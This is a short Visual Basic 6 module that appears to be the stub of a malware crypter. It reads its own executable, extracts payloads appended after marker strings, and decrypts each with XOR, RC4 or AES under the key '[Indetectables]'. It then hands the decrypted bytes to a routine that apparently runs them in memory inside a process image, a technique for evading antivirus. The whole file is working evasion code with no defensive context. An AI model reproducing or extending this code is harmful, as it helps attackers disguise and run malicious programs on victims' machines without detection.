Attribute VB_Name = "mGlob"
Option Explicit
Sub Main()
 StrPath = App.Path & "\" & App.EXEName & ".exe"
  
  Open StrPath For Binary As #1
   sMe = String(FileLen(StrPath), " ")
   Get #1, , sMe
  Close #1
   
   MeData() = Split(sMe, "[0]")
   MeData2() = Split(MeData(1), "[1]")
   For z = 1 To UBound(MeData2)
    x() = Split(MeData2(z), "[2]")
    MyFiles = x(1)
    MyEncryption = x(2)
    
    If MyEncryption = "XOR" Then MyFiles = mX0R.DecryptString(MyFiles, "[Indetectables]")
    If MyEncryption = "RC4" Then MyFiles = mRC4.DecryptString(MyFiles, "[Indetectables]")
    If MyEncryption = "AES" Then MyFiles = mAES.DecryptString(MyFiles, "[Indetectables]")
    
    mMemoryRun() = StrConv(MyFiles, vbFromUnicode)

    Call xDDDD(App.Path & "\" & App.EXEName & ".exe", mMemoryRun(), Command)
   Next z
End Sub
